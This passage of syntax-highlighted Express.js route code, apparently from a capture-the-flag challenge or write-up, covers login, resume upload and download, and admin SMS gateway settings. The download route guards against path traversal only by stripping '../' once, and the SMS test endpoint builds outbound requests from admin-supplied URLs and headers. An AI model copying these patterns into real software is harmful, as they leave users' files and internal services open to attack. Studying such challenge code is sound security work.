<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/api/login'</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">username</span><span class="mtk1">, </span><span class="mtk1">password</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.body;</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">loginUser</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">, </span><span class="mtk1">password</span><span class="mtk1">)</span>
<span class="mtk1">            .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">user</span><span class="mtk1"> </span><span class="mtk7m [tki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">token</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">sign</span><span class="mtk1">({ </span><span class="mtk1">username</span><span class="mtk1">: </span><span class="mtk9 mtki">user</span><span class="mtk1">.username });</span>
<span class="mtk1">                </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">cookie</span><span class="mtk1">(</span><span class="mtk4">'session'</span><span class="mtk1">, </span><span class="mtk1">token</span><span class="mtk1">, { </span><span class="mtk1">maxAge</span><span class="mtk1">: </span><span class="mtk6">3600000</span><span class="mtk1"> });</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'User authenticated successfully!'</span><span class="mtk1">));</span>
<span class="mtk1">            })</span>
<span class="mtk1">            .</span><span class="mtk8">catch</span><span class="mtk1">(() </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">403</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Invalid username or password!'</span><span class="mtk1">)));</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Missing parameters!'</span><span class="mtk1">));</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/dashboard'</span><span class="mtk1">, AuthMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.user.username </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'admin'</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/admin'</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">getUser</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.user.username)</span>
<span class="mtk1">        .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">user</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk9 mtki">user</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>

<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">getFormData</span><span class="mtk1">(</span><span class="mtk9 mtki">user</span><span class="mtk1">.username)</span>
<span class="mtk1">                .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">enrollment</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'dashboard.html'</span><span class="mtk1">, { </span><span class="mtk1">user</span><span class="mtk1">, </span><span class="mtk1">enrollment</span><span class="mtk1"> });</span>
<span class="mtk1">                });</span>
<span class="mtk1">        })</span>
<span class="mtk1">        .</span><span class="mtk8">catch</span><span class="mtk1">(</span><span class="mtk9 mtki">e</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>
<span class="mtk1">        })</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/api/enroll'</span><span class="mtk1">, AuthMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">getUser</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.user.username)</span>
<span class="mtk1">        .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">user</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk9 mtki">user</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>

<span class="mtk1">            </span><span class="mtk7 mtki">const</span><span class="mtk1"> {</span><span class="mtk1">full_name</span><span class="mtk1">, </span><span class="mtk1">phone</span><span class="mtk1">, </span><span class="mtk1">birth_date</span><span class="mtk1">, </span><span class="mtk1">gender</span><span class="mtk1">, </span><span class="mtk1">biography</span><span class="mtk1">} </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.body;</span>

<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">updateEnrollment</span><span class="mtk1">(</span>
<span class="mtk1">                </span><span class="mtk1">full_name</span><span class="mtk1">,</span>
<span class="mtk1">                </span><span class="mtk1">phone</span><span class="mtk1">,</span>
<span class="mtk1">                </span><span class="mtk1">birth_date</span><span class="mtk1">,</span>
<span class="mtk1">                </span><span class="mtk1">gender</span><span class="mtk1">,</span>
<span class="mtk1">                </span><span class="mtk1">biography</span><span class="mtk1"> ,</span><span class="mtk9 mtki">user</span><span class="mtk1">.username</span>
<span class="mtk1">            )</span>
<span class="mtk1">            .</span><span class="mtk8">then</span><span class="mtk1">(()  </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Your information is saved successfully!'</span><span class="mtk1">)))</span>
<span class="mtk1">            .</span><span class="mtk8">catch</span><span class="mtk1">((</span><span class="mtk9 mtki">e</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Something went wrong!'</span><span class="mtk1">)));</span>

<span class="mtk1">        })</span>
<span class="mtk1">        .</span><span class="mtk8">catch</span><span class="mtk1">(</span><span class="mtk9 mtki">e</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>
<span class="mtk1">        })</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/api/upload'</span><span class="mtk1">, AuthMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">getUser</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.user.username)</span>
<span class="mtk1">        .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk9 mtki">user</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk9 mtki">user</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>

<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk9 mtki">req</span><span class="mtk1">.files </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk9 mtki">req</span><span class="mtk1">.files.resumeFile) {</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'No files were uploaded.'</span><span class="mtk1">));</span>
<span class="mtk1">            }</span>

<span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">enrollment</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">getFormData</span><span class="mtk1">(</span><span class="mtk9 mtki">user</span><span class="mtk1">.username);</span>
<span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">resumeFile</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.files.resumeFile;</span>
<span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">uploadFile</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`</span><span class="mtk5">${</span><span class="mtk1">resumeFile</span><span class="mtk1">.md5</span><span class="mtk5">}</span><span class="mtk4">.docx`</span><span class="mtk1">;</span>

<span class="mtk1">            </span><span class="mtk1">resumeFile</span><span class="mtk1">.</span><span class="mtk8">mv</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk4">'/app/uploads'</span><span class="mtk1">, </span><span class="mtk1">uploadFile</span><span class="mtk1">), (</span><span class="mtk9 mtki">err</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">err</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Something went wrong!'</span><span class="mtk1">));</span>
<span class="mtk1">            });</span>

<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk1">enrollment</span><span class="mtk1">.resume_file </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">enrollment</span><span class="mtk1">.resume_file </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk1">uploadFile</span><span class="mtk1">){</span>
<span class="mtk1">                </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                    </span><span class="mtk8 mtku">fs</span><span class="mtk1">.</span><span class="mtk8">unlinkSync</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk4">'/app/uploads'</span><span class="mtk1">, </span><span class="mtk1">enrollment</span><span class="mtk1">.resume_file));</span>
<span class="mtk1">                }</span>
<span class="mtk1">                </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) { </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) }</span>
<span class="mtk1">            }</span>

<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">setResume</span><span class="mtk1">(</span><span class="mtk1">uploadFile</span><span class="mtk1">,</span><span class="mtk9 mtki">user</span><span class="mtk1">.username)</span>
<span class="mtk1">                .</span><span class="mtk8">then</span><span class="mtk1">(() </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1">{</span>
<span class="mtk1">                    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">({</span>
<span class="mtk1">                        </span><span class="mtk4">'message'</span><span class="mtk1">: </span><span class="mtk4">'Resume file uploaded successfully!'</span><span class="mtk1">,</span>
<span class="mtk1">                        </span><span class="mtk4">'filename'</span><span class="mtk1">: </span><span class="mtk1">uploadFile</span>
<span class="mtk1">                    });</span>
<span class="mtk1">                })</span>
<span class="mtk1">                .</span><span class="mtk8">catch</span><span class="mtk1">(() </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Something went wrong!'</span><span class="mtk1">)));</span>
<span class="mtk1">        })</span>
<span class="mtk1">        .</span><span class="mtk8">catch</span><span class="mtk1">(</span><span class="mtk9 mtki">e</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>
<span class="mtk1">        })</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/download'</span><span class="mtk1">, AuthMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">getUser</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.user.username)</span>
<span class="mtk1">        .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">user</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk9 mtki">user</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>

<span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> { </span><span class="mtk1">resume</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.query;</span>

<span class="mtk1">            </span><span class="mtk1">resume</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">resume</span><span class="mtk1">.</span><span class="mtk8">replaceAll</span><span class="mtk1">(</span><span class="mtk4">'../'</span><span class="mtk1">, </span><span class="mtk4">''</span><span class="mtk1">);</span>

<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">download</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk4">'/app/uploads'</span><span class="mtk1">, </span><span class="mtk1">resume</span><span class="mtk1">));</span>
<span class="mtk1">        })</span>
<span class="mtk1">        .</span><span class="mtk8">catch</span><span class="mtk1">(</span><span class="mtk9 mtki">e</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>
<span class="mtk1">        })</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/admin'</span><span class="mtk1">, AdminMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'admin.html'</span><span class="mtk1">, { </span><span class="mtk1">user</span><span class="mtk1">: </span><span class="mtk9 mtki">req</span><span class="mtk1">.user });</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/sms-settings'</span><span class="mtk1">, AdminMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'sms-settings.html'</span><span class="mtk1">, { </span><span class="mtk1">user</span><span class="mtk1">: </span><span class="mtk9 mtki">req</span><span class="mtk1">.user });</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/api/sms/save'</span><span class="mtk1">, AdminMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">verb</span><span class="mtk1">, </span><span class="mtk1">url</span><span class="mtk1">, </span><span class="mtk1">params</span><span class="mtk1">, </span><span class="mtk1">headers</span><span class="mtk1">, </span><span class="mtk1">resp_ok</span><span class="mtk1">, </span><span class="mtk1">resp_bad</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.body;</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk1">verb</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">url</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">params</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">headers</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">resp_ok</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">resp_bad</span><span class="mtk1">)) {</span>  
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'missing required parameters'</span><span class="mtk1">));</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">saveSMSConfig</span><span class="mtk1">(</span><span class="mtk1">verb</span><span class="mtk1">, </span><span class="mtk1">url</span><span class="mtk1">, </span><span class="mtk1">params</span><span class="mtk1">, </span><span class="mtk1">headers</span><span class="mtk1">, </span><span class="mtk1">resp_ok</span><span class="mtk1">, </span><span class="mtk1">resp_bad</span><span class="mtk1">)</span>
<span class="mtk1">        .</span><span class="mtk8">then</span><span class="mtk1">(() </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'SMS settings saved successfully!'</span><span class="mtk1">));</span>
<span class="mtk1">        })</span>
<span class="mtk1">        .</span><span class="mtk8">catch</span><span class="mtk1">((</span><span class="mtk9 mtki">e</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Something went wrong!'</span><span class="mtk1">));</span>
<span class="mtk1">        });</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/api/sms/test'</span><span class="mtk1">, AdminMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">verb</span><span class="mtk1">, </span><span class="mtk1">url</span><span class="mtk1">, </span><span class="mtk1">params</span><span class="mtk1">, </span><span class="mtk1">headers</span><span class="mtk1">, </span><span class="mtk1">resp_ok</span><span class="mtk1">, </span><span class="mtk1">resp_bad</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.body;</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk1">verb</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">url</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">params</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">headers</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">resp_ok</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">resp_bad</span><span class="mtk1">)) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'missing required parameters'</span><span class="mtk1">));</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">parsedHeaders</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {};</span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">headersArray</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">headers</span><span class="mtk1">.</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1">(</span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">header</span><span class="mtk1"> </span><span class="mtk5">of</span><span class="mtk1"> </span><span class="mtk1">headersArray</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk1">header</span><span class="mtk1">.</span><span class="mtk8">includes</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)) {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">hkey</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">header</span><span class="mtk1">.</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)[</span><span class="mtk6">0</span><span class="mtk1">].</span><span class="mtk8">trim</span><span class="mtk1">()</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">hval</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">header</span><span class="mtk1">.</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">trim</span><span class="mtk1">()</span>
<span class="mtk1">                </span><span class="mtk1">parsedHeaders</span><span class="mtk1">[</span><span class="mtk1">hkey</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">hval</span><span class="mtk1">;</span>
<span class="mtk1">            }</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) { </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) }</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">options</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
